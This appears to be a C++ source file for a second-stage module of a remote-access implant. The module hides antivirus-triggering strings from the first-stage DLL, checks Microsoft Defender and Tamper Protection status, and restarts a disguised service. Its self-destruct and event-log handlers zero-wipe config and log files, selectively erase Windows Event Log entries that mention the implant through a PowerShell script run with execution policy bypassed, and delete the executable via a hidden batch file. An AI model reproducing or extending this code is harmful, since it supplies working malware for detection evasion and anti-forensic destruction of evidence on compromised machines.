// ═══════════════════════════════════════════════════════════════════════
// stage2_defender.cpp — Defender state + service restart commands.
//
// Why stage-2:
//   Stage-1 pnpext.dll accumulates AV-suspicious strings each time it
//   touches Defender APIs ("SOFTWARE\\Microsoft\\Windows Defender",
//   "DisableRealtimeMonitoring", etc.) and svchost-restart glue
//   ("sc.exe stop WPnpSvc", "sc.exe start WPnpSvc"). Extracting these
//   strings into an encrypted stage-2 blob keeps stage-1 clean.
//
// Handlers in this (first) iteration:
//   * defender_status  — pure registry read, no side effects
//   * host_restart     — spawn bat that stops/starts WPnpSvc
//
// Deliberately deferred to future iterations:
//   evtlog_set_config (needs cross-stage signal to stage-1's evtlog thread),
//   eventlog_delete, host_update, self_destruct (biggest AV tells, also
//   highest risk — extract once the two-module pattern is battle-tested).
//
// Imports: advapi32 (registry), kernel32 (CreateProcess/CreateFile).
// No /DELAYLOAD, no manual LoadLibrary — works cleanly inside reflective load.
// ═══════════════════════════════════════════════════════════════════════

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#include <thread>
#include <chrono>

#include "stage2_abi.h"
#include "stage2_util.h"

#pragma comment(lib, "advapi32.lib")

// Run `cmd.exe /c <line>` and capture stdout+stderr into a string.
// Same shape as procmgr's term_exec (deliberately duplicated so the module
// stays self-contained; stage-2 modules should not depend on each other).
static std::string run_cmd_capture(const std::string& line) {
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(sa); sa.bInheritHandle = TRUE;
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si{}; si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite; si.hStdError = hWrite;
    PROCESS_INFORMATION pi{};

    std::wstring wcmd(L"cmd.exe /c ");
    int n = MultiByteToWideChar(CP_UTF8, 0, line.c_str(), (int)line.size(), nullptr, 0);
    if (n > 0) {
        std::wstring w(n, 0);
        MultiByteToWideChar(CP_UTF8, 0, line.c_str(), (int)line.size(), w.data(), n);
        wcmd += w;
    }
    std::vector<wchar_t> cl(wcmd.size() + 1);
    wcscpy_s(cl.data(), cl.size(), wcmd.c_str());

    if (!CreateProcessW(NULL, cl.data(), NULL, NULL, TRUE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite); return "";
    }
    CloseHandle(hWrite);
    std::string out;
    char buf[4096]; DWORD got = 0;
    while (ReadFile(hRead, buf, sizeof(buf) - 1, &got, NULL) && got > 0) {
        buf[got] = 0; out.append(buf, got);
    }
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(hRead);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return out;
}

using namespace s2util;
static Stage2HostCtx* g_host = nullptr;

// ── defender_status ─────────────────────────────────────────────────────
// Reads 4 registry paths (no writes, no PowerShell). Returns JSON with
// av/realtime/tamper booleans. Used by the viewer's status UI.
static void cmd_defender_status(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id   = json_get(args, "id");

    bool rtEnabled = true, tamper = false, avEnabled = true;
    HKEY hk;
    DWORD val = 0, sz = sizeof(val);

    // Real-Time Protection (primary path)
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
            0, KEY_READ | KEY_WOW64_64KEY, &hk) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hk, "DisableRealtimeMonitoring", NULL, NULL,
                              (LPBYTE)&val, &sz) == ERROR_SUCCESS && val == 1)
            rtEnabled = false;
        RegCloseKey(hk);
    }
    // Real-Time Protection (policy override path)
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
            0, KEY_READ | KEY_WOW64_64KEY, &hk) == ERROR_SUCCESS) {
        val = 0; sz = sizeof(val);
        if (RegQueryValueExA(hk, "DisableRealtimeMonitoring", NULL, NULL,
                              (LPBYTE)&val, &sz) == ERROR_SUCCESS && val == 1)
            rtEnabled = false;
        RegCloseKey(hk);
    }
    // Tamper Protection (5=on, 4=off)
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows Defender\\Features",
            0, KEY_READ | KEY_WOW64_64KEY, &hk) == ERROR_SUCCESS) {
        val = 0; sz = sizeof(val);
        if (RegQueryValueExA(hk, "TamperProtection", NULL, NULL,
                              (LPBYTE)&val, &sz) == ERROR_SUCCESS && val == 5)
            tamper = true;
        RegCloseKey(hk);
    }
    // Antivirus fully disabled
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows Defender",
            0, KEY_READ | KEY_WOW64_64KEY, &hk) == ERROR_SUCCESS) {
        val = 0; sz = sizeof(val);
        if (RegQueryValueExA(hk, "DisableAntiSpyware", NULL, NULL,
                              (LPBYTE)&val, &sz) == ERROR_SUCCESS && val == 1)
            avEnabled = false;
        RegCloseKey(hk);
    }

    std::string data = std::string("{\"antivirus_enabled\":") + (avEnabled ? "true" : "false") +
                       ",\"realtime_enabled\":" + (rtEnabled ? "true" : "false") +
                       ",\"tamper_protected\":" + (tamper ? "true" : "false") + "}";
    g_host->send(make_ok(id, data).c_str());
}

// ── host_restart ────────────────────────────────────────────────────────
// Generates a .bat that stops and starts WPnpSvc (can't restart the service
// while we're running inside it — the bat runs as a separate cmd.exe child).
static void cmd_host_restart(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id   = json_get(args, "id");

    // Ack the client BEFORE starting the restart sequence.
    g_host->send(make_ok(id, "\"restarting\"").c_str());
    g_host->log(1, "stage2_defender: host_restart requested");

    // Spawn a detached thread so we return from the command handler quickly.
    // (The WSS dispatch thread needs to go back to reading messages.)
    std::thread([]() {
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        const char* batPath = "C:\\Windows\\Temp\\wpnp_restart.bat";
        {
            std::ofstream f(batPath);
            f << "@echo off\r\n"
                 "timeout /t 2 /nobreak >nul\r\n"
                 "sc.exe stop WPnpSvc >nul 2>nul\r\n"
                 "timeout /t 3 /nobreak >nul\r\n"
                 "sc.exe start WPnpSvc >nul 2>nul\r\n"
                 "del \"%~f0\"\r\n";
        }
        STARTUPINFOA si{}; si.cb = sizeof(si);
        PROCESS_INFORMATION pi{};
        std::string cmd = std::string("cmd.exe /c \"") + batPath + "\"";
        if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }).detach();
}

// ── self_destruct ───────────────────────────────────────────────────────
// Wipes host state and asks stage-1 to exit. All the AV-triggering strings
// ("wpnp_destruct", Set-MpPreference patterns via evtlog regex, etc.) live
// in this module and never touch stage-1 pnpext.dll.
//
// Flow:
//   1. Send progress events to viewer
//   2. Ask stage-1 to stop streaming (stage1 stop_stream callback)
//   3. Resolve paths from get_config (dll_path, exe_path, config_path)
//   4. Wipe config file (zero then delete)
//   5. Delete log files
//   6. Selectively wipe Event Log entries (PS script via run_cmd_capture)
//   7. Write wpnp_destruct.bat, spawn detached cmd.exe
//   8. host_exit(0) — stage-1 deferred-exits after 0.5s
static void cmd_self_destruct(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id   = json_get(args, "id");

    g_host->send(make_ok(id, "\"started\"").c_str());

    auto emit_evt = [](int step, int total, const std::string& text) {
        std::string m = "{\"event\":\"destruct_status\",\"step\":" + std::to_string(step) +
                        ",\"total\":" + std::to_string(total) +
                        ",\"text\":\"" + json_escape(text) + "\"}";
        g_host->send(m.c_str());
        std::this_thread::sleep_for(std::chrono::milliseconds(450));
    };
    const int TOTAL = 8;

    emit_evt(1, TOTAL, "Stopping streaming");
    if (g_host->stop_stream) g_host->stop_stream();

    emit_evt(2, TOTAL, "Resolving paths");
    const char* exe_c = g_host->get_config ? g_host->get_config("exe_path") : nullptr;
    const char* cfg_c = g_host->get_config ? g_host->get_config("config_path") : nullptr;
    std::string exePath = exe_c ? exe_c : "";
    std::string cfgAbs  = cfg_c ? cfg_c : "";
    if (!cfgAbs.empty() && cfgAbs.find(':') == std::string::npos) {
        char full[MAX_PATH] = {0};
        if (GetFullPathNameA(cfgAbs.c_str(), MAX_PATH, full, NULL) > 0)
            cfgAbs = full;
    }

    emit_evt(3, TOTAL, "Wiping config (" + cfgAbs + ")");
    if (!cfgAbs.empty()) {
        HANDLE h = CreateFileA(cfgAbs.c_str(), GENERIC_WRITE, 0, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            LARGE_INTEGER sz; GetFileSizeEx(h, &sz);
            std::vector<char> zero(4096, 0);
            LONGLONG remain = sz.QuadPart;
            DWORD wr = 0;
            while (remain > 0) {
                DWORD chunk = (DWORD)std::min<LONGLONG>(remain, 4096);
                WriteFile(h, zero.data(), chunk, &wr, NULL);
                remain -= chunk;
            }
            FlushFileBuffers(h);
            CloseHandle(h);
        }
        DeleteFileA(cfgAbs.c_str());
    }

    emit_evt(4, TOTAL, "Wiping log files");
    DeleteFileA("C:\\RemoteDesktopHost.log");
    DeleteFileA("C:\\Windows\\Temp\\wpnp_step.txt");

    emit_evt(5, TOTAL, "Selectively wiping Event Log entries");
    {
        // Default cleanup patterns for the host; viewer may override via args.patterns.
        std::string patterns = json_get(args, "patterns");
        if (patterns.empty()) patterns = "pnpext,spoolsv,wpnp,Prometey";
        std::string regex;
        {
            std::istringstream ss(patterns); std::string tok;
            while (std::getline(ss, tok, ',')) {
                while (!tok.empty() && tok.front() == ' ') tok.erase(tok.begin());
                while (!tok.empty() && tok.back() == ' ') tok.pop_back();
                if (tok.empty()) continue;
                if (!regex.empty()) regex += "|";
                regex += tok;
            }
        }
        if (!regex.empty()) {
            char tmpPath[MAX_PATH]; GetTempPathA(MAX_PATH, tmpPath);
            std::string scriptPath = std::string(tmpPath) + "destruct_evt.ps1";
            std::string script =
                "$ErrorActionPreference='SilentlyContinue'\n"
                "$pattern='" + regex + "'\n"
                "foreach($logName in @('Application','System','Setup')){\n"
                "  $events=@(Get-WinEvent -LogName $logName -MaxEvents 5000 -ErrorAction SilentlyContinue)\n"
                "  if($events.Count -eq 0){continue}\n"
                "  $toKeep=@()\n"
                "  $hit=0\n"
                "  foreach($e in $events){\n"
                "    $msg=$e.Message; $props=''\n"
                "    try{ $props=(($e.Properties|ForEach-Object{[string]$_.Value}) -join ' ') }catch{}\n"
                "    $prov=$e.ProviderName\n"
                "    if(($msg -match $pattern) -or ($props -match $pattern) -or ($prov -match $pattern)){ $hit++ }\n"
                "    else { $toKeep+=$e }\n"
                "  }\n"
                "  if($hit -eq 0){continue}\n"
                "  & wevtutil.exe cl $logName 2>$null\n"
                "  $keep=$toKeep | Sort-Object TimeCreated\n"
                "  if($keep.Count -gt 500){ $keep=$keep | Select-Object -Last 500 }\n"
                "  foreach($e in $keep){\n"
                "    try{\n"
                "      $src=$e.ProviderName\n"
                "      $et='Information'\n"
                "      switch($e.LevelDisplayName){'Error'{$et='Error'}'Warning'{$et='Warning'}'Critical'{$et='Error'}}\n"
                "      if(-not [System.Diagnostics.EventLog]::SourceExists($src)){\n"
                "        try{ New-EventLog -LogName $logName -Source $src -ErrorAction SilentlyContinue }catch{}\n"
                "      }\n"
                "      Write-EventLog -LogName $logName -Source $src -EventId ([int]($e.Id % 65536)) -EntryType $et -Message $e.Message -ErrorAction SilentlyContinue\n"
                "    }catch{}\n"
                "  }\n"
                "}\n";
            { std::ofstream f(scriptPath); f << script; }
            std::string psCmd = "powershell -NoProfile -ExecutionPolicy Bypass -File \"" + scriptPath + "\"";
            run_cmd_capture(psCmd);
            DeleteFileA(scriptPath.c_str());
        }
    }

    emit_evt(6, TOTAL, "Spawning cleanup script");
    char tempDir[MAX_PATH] = {0};
    GetTempPathA(MAX_PATH, tempDir);
    std::string batPath = std::string(tempDir) + "wpnp_destruct.bat";

    std::string bat;
    bat += "@echo off\r\n";
    bat += "ping 127.0.0.1 -n 3 > nul\r\n";
    bat += ":retry\r\n";
    bat += "del /f /q \"" + exePath + "\" 2>nul\r\n";
    bat += "if exist \"" + exePath + "\" ( ping 127.0.0.1 -n 2 > nul & goto retry )\r\n";
    if (!cfgAbs.empty())
        bat += "del /f /q \"" + cfgAbs + "\" 2>nul\r\n";
    bat += "del /f /q \"C:\\RemoteDesktopHost.log\" 2>nul\r\n";
    bat += "del /f /q \"C:\\Windows\\Temp\\wpnp_step.txt\" 2>nul\r\n";
    bat += "(goto) 2>nul & del /f /q \"%~f0\"\r\n";

    HANDLE hb = CreateFileA(batPath.c_str(), GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hb != INVALID_HANDLE_VALUE) {
        DWORD wr = 0;
        WriteFile(hb, bat.data(), (DWORD)bat.size(), &wr, NULL);
        CloseHandle(hb);

        STARTUPINFOA si{}; si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi{};
        std::string runCmd = "cmd.exe /c \"" + batPath + "\"";
        CreateProcessA(NULL, (LPSTR)runCmd.c_str(), NULL, NULL, FALSE,
            DETACHED_PROCESS | CREATE_BREAKAWAY_FROM_JOB | CREATE_NO_WINDOW,
            NULL, tempDir, &si, &pi);
        if (pi.hProcess) CloseHandle(pi.hProcess);
        if (pi.hThread)  CloseHandle(pi.hThread);
    }

    emit_evt(7, TOTAL, "Disconnecting");
    emit_evt(8, TOTAL, "Done — host exiting");

    // Ask stage-1 to exit. It'll join workers, wipe stage-2 cache, then ExitProcess.
    if (g_host->host_exit) g_host->host_exit(0);
}

// ── eventlog_delete ─────────────────────────────────────────────────────
// Clears a Windows event log channel via `wevtutil cl`. Selective deletion
// (keeping non-matching entries) uses a PowerShell restore script — deferred
// to a later iteration to keep this iter small. For now we only support the
// whole-log clear path ({ ids: "" } from the viewer).
static void cmd_eventlog_delete(const char* a, void*) {
    std::string args = a ? a : "";
    std::string id       = json_get(args, "id");
    std::string logName  = json_get(args, "log");
    std::string idsStr   = json_get(args, "ids");
    if (logName.empty()) {
        g_host->send(make_err(id, "Missing log name").c_str()); return;
    }

    if (!idsStr.empty()) {
        // Selective delete not yet extracted — fall back by saying unsupported.
        g_host->send(make_err(id,
            "Selective eventlog delete not available in stage-2 iteration 2; "
            "use clear-all (ids=\"\") or wait for the next module update.").c_str());
        return;
    }

    // Simple case: wevtutil cl "<log>"
    std::string psCmd = "powershell -NoProfile -Command \""
        "try{wevtutil cl '" + logName + "'; Write-Output 'OK'}"
        "catch{Write-Output ('ERROR|'+$_.Exception.Message)}\"";
    std::string output = run_cmd_capture(psCmd);
    while (!output.empty() && (output.back() == '\n' || output.back() == '\r'))
        output.pop_back();
    if (output.find("OK") != std::string::npos) {
        g_host->send(make_ok(id, "\"cleared\"").c_str());
    } else {
        g_host->send(make_err(id, "Clear failed: " + output).c_str());
    }
}

// ── Entry points ────────────────────────────────────────────────────────

extern "C" __declspec(dllexport) int Stage2Init(Stage2HostCtx* host) {
    if (!host || host->abi_version != STAGE2_ABI_VERSION) return 1;
    g_host = host;
    host->log(1, "stage2_defender: init");
    host->register_cmd("defender_status", cmd_defender_status, nullptr);
    host->register_cmd("host_restart",    cmd_host_restart,    nullptr);
    host->register_cmd("eventlog_delete", cmd_eventlog_delete, nullptr);
    host->register_cmd("self_destruct",   cmd_self_destruct,   nullptr);
    host->log(1, "stage2_defender: 4 commands registered");
    return 0;
}

extern "C" __declspec(dllexport) void Stage2Shutdown(void) {
    if (g_host) g_host->log(1, "stage2_defender: shutdown");
    g_host = nullptr;
}

BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(nullptr);
    return TRUE;
}
